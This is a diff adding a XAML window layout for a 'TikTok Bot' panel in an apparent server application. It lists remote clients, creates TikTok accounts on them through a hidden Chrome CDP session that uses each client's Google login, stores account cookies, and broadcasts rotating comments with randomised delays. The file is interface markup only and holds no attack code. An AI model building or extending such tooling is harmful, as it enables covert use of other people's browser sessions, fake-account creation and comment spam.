@@ -1,0 +1,354 @@
+﻿<dx:ThemedWindow x:Class="SeroServer.UI.TikTokWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:dx="http://schemas.devexpress.com/winfx/2008/xaml/core"
+        Title="TikTok Bot"
+        Width="960" Height="700" MinWidth="760" MinHeight="520"
+        WindowStartupLocation="CenterOwner"
+        ResizeMode="CanResize"
+        ShowGlow="False">
+
+        <DockPanel LastChildFill="True">
+
+            <!-- Title bar -->
+            <Border DockPanel.Dock="Top" Height="42" Background="{DynamicResource TitleBgBrush}" BorderBrush="{DynamicResource TitleBorderBrush}" BorderThickness="0,0,0,1">
+                <Grid Margin="14,0">
+                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                        <Border x:Name="BadgeRunning" Margin="10,0,0,0" CornerRadius="3"
+                                Background="#0A1E10" BorderBrush="#1A5E28" BorderThickness="1"
+                                Padding="6,2" Visibility="Collapsed" VerticalAlignment="Center">
+                            <StackPanel Orientation="Horizontal">
+                                <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
+                                    <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="4" ShadowDepth="0" Opacity="0.9"/></Ellipse.Effect>
+                                </Ellipse>
+                                <TextBlock x:Name="TxtBadge" Text="POSTING" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Segoe UI Variable Text, Segoe UI"/>
+                            </StackPanel>
+                        </Border>
+                    </StackPanel>
+                </Grid>
+            </Border>
+
+            <!-- Status bar -->
+            <Border DockPanel.Dock="Bottom" Height="28" Background="{DynamicResource TitleBgBrush}"
+                    BorderBrush="{DynamicResource InputBorderBrush}" BorderThickness="0,1,0,0">
+                <Grid Margin="14,0">
+                    <TextBlock x:Name="TxtStatus" Text="Ready" Foreground="{DynamicResource TitleTextBrush}"
+                               FontSize="11" FontFamily="Consolas" VerticalAlignment="Center"/>
+                    <TextBlock x:Name="TxtProgress" Text="" Foreground="{DynamicResource AccentBrush}"
+                               FontSize="11" FontFamily="Consolas" VerticalAlignment="Center"
+                               HorizontalAlignment="Right" Margin="0,0,4,0"/>
+                </Grid>
+            </Border>
+
+            <!-- Main -->
+            <Grid>
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="200" MinWidth="140"/>
+                    <ColumnDefinition Width="4"/>
+                    <ColumnDefinition Width="*"/>
+                </Grid.ColumnDefinitions>
+
+                <!-- - Left: client list - -->
+                <Border Grid.Column="0" Background="{DynamicResource SidebarCtrlBgBrush}" BorderBrush="{DynamicResource InputBorderBrush}" BorderThickness="0,0,1,0">
+                    <DockPanel LastChildFill="True">
+
+                        <Border DockPanel.Dock="Top" Background="{DynamicResource TitleBgBrush}" BorderBrush="{DynamicResource InputBorderBrush}"
+                                BorderThickness="0,0,0,1" Padding="10,5">
+                            <Grid>
+                                <TextBlock Text="CLIENTS" FontSize="9" FontWeight="Bold"
+                                           Foreground="{DynamicResource LabelBrush}" FontFamily="Consolas" VerticalAlignment="Center"/>
+                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right">
+                                    <Button x:Name="BtnSelectAll" Content="All" FontSize="9" Height="18" Padding="6,0"
+                                            Style="{StaticResource SBtn}" Click="BtnSelectAll_Click"/>
+                                    <Button x:Name="BtnSelectNone" Content="None" FontSize="9" Height="18" Padding="6,0"
+                                            Style="{StaticResource SBtn}" Margin="4,0,0,0" Click="BtnSelectNone_Click"/>
+                                </StackPanel>
+                            </Grid>
+                        </Border>
+                        <Border DockPanel.Dock="Bottom" Background="{DynamicResource TitleBgBrush}" BorderBrush="{DynamicResource InputBorderBrush}"
+                                BorderThickness="0,1,0,0" Padding="10,4">
+                            <TextBlock x:Name="TxtSelCount" FontSize="9" FontFamily="Consolas"
+                                       Foreground="{DynamicResource LabelBrush}" VerticalAlignment="Center"/>
+                        </Border>
+
+                        <ListBox x:Name="ClientList" Background="Transparent" BorderThickness="0"
+                                 Foreground="{DynamicResource ContentTextBrush}" FontFamily="Segoe UI Variable Text, Segoe UI" FontSize="12">
+                            <ListBox.ItemContainerStyle>
+                                <Style TargetType="ListBoxItem">
+                                    <Setter Property="Background"      Value="Transparent"/>
+                                    <Setter Property="Padding"         Value="6,4"/>
+                                    <Setter Property="BorderThickness" Value="0"/>
+                                    <Setter Property="Template">
+                                        <Setter.Value>
+                                            <ControlTemplate TargetType="ListBoxItem">
+                                                <Border x:Name="bd" Background="{TemplateBinding Background}" Padding="{TemplateBinding Padding}">
+                                                    <ContentPresenter/>
+                                                </Border>
+                                                <ControlTemplate.Triggers>
+                                                    <Trigger Property="IsMouseOver" Value="True">
+                                                        <Setter TargetName="bd" Property="Background" Value="{DynamicResource InputBgBrush}"/>
+                                                    </Trigger>
+                                                </ControlTemplate.Triggers>
+                                            </ControlTemplate>
+                                        </Setter.Value>
+                                    </Setter>
+                                </Style>
+                            </ListBox.ItemContainerStyle>
+                            <ListBox.ItemTemplate>
+                                <DataTemplate>
+                                    <Grid>
+                                        <Grid.ColumnDefinitions>
+                                            <ColumnDefinition Width="Auto"/>
+                                            <ColumnDefinition Width="*"/>
+                                        </Grid.ColumnDefinitions>
+                                        <CheckBox Grid.Column="0" IsChecked="{Binding Selected, Mode=TwoWay}"
+                                                  VerticalAlignment="Center" Margin="0,0,6,0"
+                                                  Checked="Client_SelectChanged" Unchecked="Client_SelectChanged"/>
+                                        <StackPanel Grid.Column="1">
+                                            <TextBlock Text="{Binding Label}" Foreground="{DynamicResource ContentTextBrush}"
+                                                       FontSize="11" FontFamily="Segoe UI Variable Text, Segoe UI"/>
+                                            <TextBlock Text="{Binding Status}" Foreground="{DynamicResource LabelBrush}"
+                                                       FontSize="9" FontFamily="Consolas" Margin="0,1,0,2"/>
+                                        </StackPanel>
+                                    </Grid>
+                                </DataTemplate>
+                            </ListBox.ItemTemplate>
+                        </ListBox>
+                    </DockPanel>
+                </Border>
+
+                <GridSplitter Grid.Column="1" Width="4" Background="{DynamicResource WindowBgBrush}"
+                              HorizontalAlignment="Stretch" Cursor="SizeWE"/>
+
+                <!-- - Right: main panel - -->
+                <ScrollViewer Grid.Column="2" VerticalScrollBarVisibility="Auto">
+                <StackPanel Margin="14,12">
+
+                    <!-- - CDP Auto-Signup - -->
+                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
+                            Background="{DynamicResource SectionBgBrush}" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}">
+                        <StackPanel>
+                            <Grid Margin="0,0,0,8">
+                                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                                    <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Contact.svg'}" Width="11" Height="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
+                                    <TextBlock Text="AUTO-SIGNUP (Chrome CDP)" FontSize="9" FontWeight="Bold"
+                                               Foreground="{DynamicResource LabelBrush}" FontFamily="Consolas" VerticalAlignment="Center"/>
+                                    <TextBlock Text="  &#x2014; Google session required on client" Foreground="{DynamicResource FieldLabelBrush}"
+                                               FontSize="9" FontFamily="Segoe UI Variable Text, Segoe UI" VerticalAlignment="Center"/>
+                                </StackPanel>
+                                <Button x:Name="BtnCdpSignup" Height="26" Padding="12,0"
+                                        HorizontalAlignment="Right" Style="{StaticResource SGreenBtn}"
+                                        FontSize="10" Click="BtnCdpSignup_Click"
+                                        ToolTip="Creates TikTok accounts on all selected clients via Chrome hidden CDP session">
+                                    <StackPanel Orientation="Horizontal">
+                                        <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Contact.svg'}" Width="12" Height="12" Margin="0,0,5,0" VerticalAlignment="Center"/>
+                                        <TextBlock Text="Signup Selected" VerticalAlignment="Center"/>
+                                    </StackPanel>
+                                </Button>
+                            </Grid>
+                            <Border Background="{DynamicResource WindowBgBrush}" CornerRadius="4" Height="72">
+                                <TextBox x:Name="TxtCdpLog"
+                                         Background="Transparent" Foreground="{DynamicResource ContentTextBrush}"
+                                         FontFamily="Consolas" FontSize="10"
+                                         BorderThickness="0" Padding="8,5"
+                                         IsReadOnly="True" TextWrapping="Wrap"
+                                         VerticalScrollBarVisibility="Auto" AcceptsReturn="True">
+                                    <TextBox.Style>
+                                        <Style TargetType="TextBox">
+                                            <Setter Property="Template">
+                                                <Setter.Value>
+                                                    <ControlTemplate TargetType="TextBox">
+                                                        <Border Background="{TemplateBinding Background}" Padding="{TemplateBinding Padding}">
+                                                            <ScrollViewer x:Name="PART_ContentHost" Focusable="False" Background="Transparent"
+                                                                          VerticalScrollBarVisibility="{TemplateBinding ScrollViewer.VerticalScrollBarVisibility}"
+                                                                          HorizontalScrollBarVisibility="{TemplateBinding ScrollViewer.HorizontalScrollBarVisibility}"/>
+                                                        </Border>
+                                                    </ControlTemplate>
+                                                </Setter.Value>
+                                            </Setter>
+                                        </Style>
+                                    </TextBox.Style>
+                                </TextBox>
+                            </Border>
+                        </StackPanel>
+                    </Border>
+
+                    <!-- - Account inventory - -->
+                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
+                            Background="{DynamicResource TitleBgBrush}" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}">
+                        <StackPanel>
+                            <Grid Margin="0,0,0,8">
+                                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                                    <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Document.svg'}" Width="11" Height="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
+                                    <TextBlock Text="ACCOUNTS" FontSize="9" FontWeight="Bold"
+                                               Foreground="{DynamicResource LabelBrush}" FontFamily="Consolas" VerticalAlignment="Center"/>
+                                </StackPanel>
+                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right">
+                                    <TextBlock x:Name="TxtAccountCount" Text="0 accounts"
+                                               Foreground="{DynamicResource LabelBrush}" FontSize="10" FontFamily="Consolas"
+                                               VerticalAlignment="Center" Margin="0,0,10,0"/>
+                                    <Button Content="Clear" Height="22" Padding="8,0"
+                                            Style="{StaticResource SBtn}" FontSize="9" Click="BtnClearAccounts_Click"/>
+                                </StackPanel>
+                            </Grid>
+                            <DataGrid x:Name="GridAccounts"
+                                      AutoGenerateColumns="False" IsReadOnly="True"
+                                      Background="Transparent" Foreground="{DynamicResource ContentTextBrush}"
+                                      BorderThickness="0" RowBackground="Transparent"
+                                      AlternatingRowBackground="{DynamicResource AlternatingRowBgBrush}"
+                                      GridLinesVisibility="None" HeadersVisibility="Column"
+                                      FontFamily="Consolas" FontSize="11"
+                                      CanUserAddRows="False" CanUserResizeRows="False"
+                                      ColumnHeaderHeight="32" MaxHeight="160"
+                                      ColumnHeaderStyle="{StaticResource SColHeader}">
+                                <DataGrid.Columns>
+                                    <DataGridTextColumn Header="CLIENT"  Binding="{Binding Label}"       Width="120"/>
+                                    <DataGridTextColumn Header="STATUS"  Binding="{Binding Status}"      Width="150"/>
+                                    <DataGridTextColumn Header="COOKIE"  Binding="{Binding CookieShort}" Width="*"/>
+                                </DataGrid.Columns>
+                            </DataGrid>
+                        </StackPanel>
+                    </Border>
+
+                    <!-- - Comment broadcast - -->
+                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
+                            Background="{DynamicResource SectionBgBrush}" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}">
+                        <StackPanel>
+                            <StackPanel Orientation="Horizontal" Margin="0,0,0,10">
+                                <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Document.svg'}" Width="11" Height="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
+                                <TextBlock Text="COMMENT BROADCAST" FontSize="9" FontWeight="Bold"
+                                           Foreground="{DynamicResource LabelBrush}" FontFamily="Consolas" VerticalAlignment="Center"/>
+                            </StackPanel>
+
+                            <!-- Target -->
+                            <Grid Margin="0,0,0,8">
+                                <Grid.ColumnDefinitions>
+                                    <ColumnDefinition Width="Auto"/>
+                                    <ColumnDefinition Width="*"/>
+                                    <ColumnDefinition Width="Auto"/>
+                                    <ColumnDefinition Width="Auto"/>
+                                </Grid.ColumnDefinitions>
+                                <TextBlock Text="URL / ID" Grid.Column="0" Foreground="{DynamicResource LabelBrush}" FontSize="11"
+                                           VerticalAlignment="Center" Margin="0,0,8,0"/>
+                                <TextBox x:Name="TxtVideoId" Grid.Column="1"
+                                         Style="{StaticResource STxt}" Height="28" FontSize="11"
+                                         ToolTip="TikTok video URL, livestream URL, or numeric ID"/>
+                                <RadioButton x:Name="RbVideo" Grid.Column="2" Content="Video"
+                                             Foreground="{DynamicResource ContentTextBrush}" FontSize="11" VerticalAlignment="Center"
+                                             Margin="10,0,8,0" GroupName="TargetType" IsChecked="True"
+                                             Checked="RbTarget_Changed"/>
+                                <RadioButton x:Name="RbLive"  Grid.Column="3" Content="Live"
+                                             Foreground="{DynamicResource ContentTextBrush}" FontSize="11" VerticalAlignment="Center"
+                                             GroupName="TargetType" Checked="RbTarget_Changed"/>
+                            </Grid>
+
+                            <!-- Comments -->
+                            <Grid Margin="0,0,0,8">
+                                <Grid.RowDefinitions>
+                                    <RowDefinition Height="Auto"/>
+                                    <RowDefinition Height="80"/>
+                                </Grid.RowDefinitions>
+                                <Grid Grid.Row="0" Margin="0,0,0,4">
+                                    <TextBlock Text="COMMENTS  (one per line &#x2014; rotated across accounts)"
+                                               Foreground="{DynamicResource FieldLabelBrush}" FontSize="9" FontFamily="Segoe UI Variable Text, Segoe UI"
+                                               VerticalAlignment="Center"/>
+                                    <TextBlock x:Name="TxtQueueCount" Text="0"
+                                               Foreground="{DynamicResource LabelBrush}" FontSize="10" FontFamily="Consolas"
+                                               HorizontalAlignment="Right" VerticalAlignment="Center"/>
+                                </Grid>
+                                <TextBox x:Name="TxtComments" Grid.Row="1"
+                                         Style="{StaticResource STxt}" TextWrapping="Wrap"
+                                         AcceptsReturn="True" FontSize="12"
+                                         TextChanged="TxtComments_Changed"/>
+                            </Grid>
+
+                            <!-- Delay + actions -->
+                            <Grid>
+                                <Grid.ColumnDefinitions>
+                                    <ColumnDefinition Width="Auto"/>
+                                    <ColumnDefinition Width="54"/>
+                                    <ColumnDefinition Width="Auto"/>
+                                    <ColumnDefinition Width="54"/>
+                                    <ColumnDefinition Width="*"/>
+                                    <ColumnDefinition Width="Auto"/>
+                                    <ColumnDefinition Width="Auto"/>
+                                    <ColumnDefinition Width="Auto"/>
+                                </Grid.ColumnDefinitions>
+                                <TextBlock Grid.Column="0" Text="Delay (s):" Foreground="{DynamicResource LabelBrush}" FontSize="11"
+                                           VerticalAlignment="Center" Margin="0,0,6,0"/>
+                                <TextBox x:Name="TxtDelayMin" Grid.Column="1" Text="5"
+                                         Style="{StaticResource STxt}" Height="28" FontSize="11"/>
+                                <TextBlock Grid.Column="2" Text="·" FontFamily="Segoe UI" Foreground="{DynamicResource LabelBrush}" FontSize="11"
+                                           VerticalAlignment="Center" Margin="6,0"/>
+                                <TextBox x:Name="TxtDelayMax" Grid.Column="3" Text="15"
+                                         Style="{StaticResource STxt}" Height="28" FontSize="11"/>
+                                <TextBlock x:Name="TxtSentCount" Grid.Column="4" Text=""
+                                           Foreground="{DynamicResource AccentBrush}" FontSize="10" FontFamily="Consolas"
+                                           VerticalAlignment="Center" Margin="10,0,0,0"/>
+                                <Button x:Name="BtnStart" Grid.Column="5" Height="30"
+                                        Padding="14,0" Margin="0,0,6,0"
+                                        Style="{StaticResource SGreenBtn}" FontSize="11" FontWeight="SemiBold"
+                                        Click="BtnStart_Click"
+                                        ToolTip="Post to all accounts that have a cookie">
+                                    <Button.Content>
+                                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                                            <TextBlock Text="&#xE724;" FontFamily="Segoe MDL2 Assets, Segoe Fluent Icons" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
+                                            <TextBlock Text="Post" FontSize="11" FontWeight="SemiBold" VerticalAlignment="Center"/>
+                                        </StackPanel>
+                                    </Button.Content>
+                                </Button>
+                                <Button x:Name="BtnStop" Grid.Column="6" Content="&#x25A0; Stop" Height="30"
+                                        Padding="12,0" Margin="0,0,6,0"
+                                        Style="{StaticResource SRedBtn}" FontSize="11"
+                                        IsEnabled="False" Click="BtnStop_Click"/>
+                                <Button Grid.Column="7" Content="Once" Height="30" Padding="12,0"
+                                        Style="{StaticResource SBtn}" FontSize="11"
+                                        Click="BtnPostOnce_Click"
+                                        ToolTip="Post one comment from each account, once"/>
+                            </Grid>
+                        </StackPanel>
+                    </Border>
+
+                    <!-- - Log - -->
+                    <Border Padding="12,10" CornerRadius="6"
+                            Background="{DynamicResource SectionBgBrush}" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}">
+                        <StackPanel>
+                            <Grid Margin="0,0,0,8">
+                                <TextBlock Text="LOG" FontSize="9" FontWeight="Bold"
+                                           Foreground="{DynamicResource LabelBrush}" FontFamily="Consolas" VerticalAlignment="Center"/>
+                                <Button Content="Clear" Height="20" Padding="8,0" HorizontalAlignment="Right"
+                                        Style="{StaticResource SBtn}" FontSize="9" Click="BtnClearLog_Click"/>
+                            </Grid>
+                            <Border Background="{DynamicResource WindowBgBrush}" CornerRadius="4" Height="100">
+                                <TextBox x:Name="TxtLog"
+                                         Background="Transparent" Foreground="{DynamicResource ContentTextBrush}"
+                                         FontFamily="Consolas" FontSize="11"
+                                         BorderThickness="0" Padding="8,6"
+                                         IsReadOnly="True" TextWrapping="Wrap"
+                                         VerticalScrollBarVisibility="Auto" AcceptsReturn="True">
+                                    <TextBox.Style>
+                                        <Style TargetType="TextBox">
+                                            <Setter Property="Template">
+                                                <Setter.Value>
+                                                    <ControlTemplate TargetType="TextBox">
+                                                        <Border Background="{TemplateBinding Background}" Padding="{TemplateBinding Padding}">
+                                                            <ScrollViewer x:Name="PART_ContentHost" Focusable="False" Background="Transparent"
+                                                                          VerticalScrollBarVisibility="{TemplateBinding ScrollViewer.VerticalScrollBarVisibility}"
+                                                                          HorizontalScrollBarVisibility="{TemplateBinding ScrollViewer.HorizontalScrollBarVisibility}"/>
+                                                        </Border>
+                                                    </ControlTemplate>
+                                                </Setter.Value>
+                                            </Setter>
+                                        </Style>
+                                    </TextBox.Style>
+                                </TextBox>
+                            </Border>
+                        </StackPanel>
+                    </Border>
+
+                </StackPanel>
+                </ScrollViewer>
+            </Grid>
+
+        </DockPanel>
+</dx:ThemedWindow>
